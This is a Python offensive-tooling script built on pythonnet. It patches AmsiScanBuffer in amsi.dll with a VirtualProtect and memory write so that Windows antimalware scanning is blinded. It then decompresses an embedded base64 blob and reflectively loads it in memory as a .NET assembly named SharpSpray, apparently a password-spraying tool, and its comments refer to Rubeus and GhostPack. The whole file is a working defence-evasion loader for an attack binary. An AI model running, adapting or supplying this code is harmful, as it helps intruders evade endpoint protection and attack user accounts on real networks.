import base64
import zlib
import argparse
import clr
import ctypes
from ctypes import *
import System
from System import Array, IntPtr, UInt32
from System.Reflection import Assembly
import System.Reflection as Reflection

# Ensure necessary .NET references are added
clr.AddReference("System.Management.Automation")

from System.Management.Automation import Runspaces, RunspaceInvoke
from System.Runtime.InteropServices import Marshal

base64_str = "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"


def bypass():
    """
    Bypasses the Antimalware Scan Interface (AMSI) by patching the AmsiScanBuffer method in amsi.dll.
    This allows scripts to run without being scanned and potentially blocked by AMSI.
    """
    windll.LoadLibrary("amsi.dll")
    windll.kernel32.GetModuleHandleW.argtypes = [c_wchar_p]
    windll.kernel32.GetModuleHandleW.restype = c_void_p
    handle = windll.kernel32.GetModuleHandleW('amsi.dll')
    windll.kernel32.GetProcAddress.argtypes = [c_void_p, c_char_p]
    windll.kernel32.GetProcAddress.restype = c_void_p
    BufferAddress = windll.kernel32.GetProcAddress(handle, "AmsiScanBuffer")
    BufferAddress = IntPtr(BufferAddress)
    Size = System.UInt32(0x05)
    ProtectFlag = System.UInt32(0x40)
    OldProtectFlag = Marshal.AllocHGlobal(0)
    virt_prot = windll.kernel32.VirtualProtect(BufferAddress, Size, ProtectFlag, OldProtectFlag)
    patch = System.Array[System.Byte]((System.UInt32(0xB8), System.UInt32(0x57), System.UInt32(0x00), System.UInt32(0x07), System.UInt32(0x80), System.UInt32(0xC3)))
    Marshal.Copy(patch, 0, BufferAddress, 6)

def base64_to_bytes(base64_string):
    """
    Converts a base64 encoded string to a .NET byte array after decompressing it.
    Args:
        base64_string: The base64 encoded and compressed string to convert.
    Returns:
        A .NET byte array of the decompressed data.
    """
    # Decode the base64 string to get the compressed binary data
    compressed_data = base64.b64decode(base64_string)
    # Decompress the data
    decompressed_data = zlib.decompress(compressed_data)
    # Convert the decompressed binary data to a .NET byte array
    return System.Array[System.Byte](decompressed_data)

def load_and_execute_assembly(command):
    """
    Loads a .NET assembly from a base64 encoded and compressed string, and executes a specified method.
    Args:
        command: The command to execute within the loaded assembly.
    Returns:
        The result of the executed command.
    """
    
    assembly_bytes = base64_to_bytes(base64_str)
    
    # Load the assembly
    assembly = Assembly.Load(assembly_bytes)
    
    # Get the type of the Rubeus.Program class
    program_type = assembly.GetType("SharpSpray.Program")
    # You don't need to create an instance of the class for a static method
    method = program_type.GetMethod("MainString")
    #Have to do this nesting thing to deal with different main entry points and public/private methods  
    if method == None:
        method =program_type.GetMethod("Main")
        if method == None:
            method = program_type.GetMethod("Main",Reflection.BindingFlags.NonPublic | Reflection.BindingFlags.Static)
        # Create a jagged array to pass in an array of string arrays to satisfy arguments requirements
        command_array = Array[str](command)
        command_args = System.Array[System.Object]([command_array])
    else:
        #Ghost Pack stuff like rubeus use a different input
        command_args = Array[str]([command]) 

    # Invoke the MainString method
    result = method.Invoke(None, command_args)

    return result
    
def main():
    bypass()
    parser = argparse.ArgumentParser(description='Execute a command on a hardcoded base64 encoded assembly')
    parser.add_argument('command', type=str, nargs='?', default="", 
                        help='Command to execute (like "help" or "triage"). If not specified, a default command is executed.')

    args = parser.parse_args()
    
    result = load_and_execute_assembly(args.command)
    print(result)

if __name__ == "__main__":
    main()